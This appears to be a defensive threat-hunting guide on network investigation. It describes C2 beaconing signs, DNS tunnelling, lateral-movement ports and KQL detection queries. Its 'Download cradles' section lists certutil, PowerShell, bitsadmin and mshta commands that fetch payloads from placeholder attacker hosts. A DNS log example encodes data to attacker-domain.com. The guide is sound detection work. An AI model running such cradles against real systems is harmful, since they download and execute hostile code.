# Network investigation

## What you're looking for

Malware needs to phone home (C2), download more tools, or exfiltrate data. All of that leaves network traces.

---

## C2 beaconing signals

Full detail in [08-c2-beaconing.md](08-c2-beaconing.md).

| Signal | What it looks like |
|--------|--------------------|
| High connection count | Same device → same external IP, 50–1000+ times per day |
| Regular timing | Low standard deviation of intervals = mechanical timer |
| Uniform byte sizes | Every connection sends/receives identical byte counts |
| After-hours traffic | Connections at 1–5am when the user is asleep |
| Suspicious process | `svchost.exe` from AppData, random-named binary making outbound calls |

**Cobalt Strike defaults:**
- 60 second interval, 0% jitter
- Port 80 or 443
- User agent: `Mozilla/4.0 (IE 7.0; Win32)` — nobody runs IE7, instant red flag

---

## Download cradles

```
certutil.exe -urlcache -split -f "http://185.x.x.x/payload.exe" C:\Users\Public\svchost.exe
powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString('http://...')"
bitsadmin.exe /transfer job1 http://malicious.com/p.exe C:\Temp\p.exe
mshta.exe http://185.x.x.x/payload.hta
```

Suspicious destinations:
- Raw IP addresses (no domain)
- Paste sites: pastebin.com, raw.githubusercontent.com
- Newly registered domains (days/weeks old)
- `.xyz`, `.top`, `.tk` TLDs in unusual contexts

---

## DNS beaconing / tunnelling

Malware tunnels C2 or exfil data inside DNS queries, which most firewalls don't inspect.

```
11:00:00  aGVsbG8.c2.attacker-domain.com     ← base64 in subdomain
11:01:01  d29ybGQ.c2.attacker-domain.com
11:02:00  dGVzdA.c2.attacker-domain.com
```

Red flags: long base64-looking subdomains changing every query, high rate to one second-level domain.

---

## Lateral movement — network signals

| Pattern | Meaning |
|---------|---------|
| Many connections to internal IPs on port 445 | SMB scanning |
| Connections to port 3389 on multiple internal IPs | RDP lateral movement |
| Connections to port 5985/5986 | WinRM / PowerShell remoting |
| Connections to port 135/139 | WMI or legacy SMB |

---

## KQL queries

Standalone query files in [kql/network/](../kql/network/).

### All external connections from a device
```kql
DeviceNetworkEvents
| where DeviceName == "HOSTNAME"
| where Timestamp > ago(24h)
| where RemoteIPType != "Private"
| project Timestamp, RemoteIP, RemoteUrl, RemotePort,
    InitiatingProcessFileName, SentBytes, ReceivedBytes
| order by Timestamp asc
```

### High connection count sweep
```kql
DeviceNetworkEvents
| where Timestamp > ago(24h)
| where RemoteIPType != "Private"
| where RemoteIP != ""
| summarize
    ConnectionCount = count(),
    FirstSeen = min(Timestamp),
    LastSeen = max(Timestamp),
    Processes = make_set(InitiatingProcessFileName, 3),
    TotalBytesSent = sum(SentBytes)
    by DeviceName, RemoteIP, RemoteUrl, RemotePort
| where ConnectionCount > 30
| extend DurationHrs = round(datetime_diff('minute', LastSeen, FirstSeen) / 60.0, 1)
| order by ConnectionCount desc
```

### Internal lateral movement scanning
```kql
DeviceNetworkEvents
| where DeviceName == "HOSTNAME"
| where RemoteIPType == "Private"
| where RemotePort in (445, 3389, 22, 135, 139, 5985, 5986)
| where Timestamp > ago(2h)
| summarize TargetCount = dcount(RemoteIP) by RemotePort, InitiatingProcessFileName
| order by TargetCount desc
```
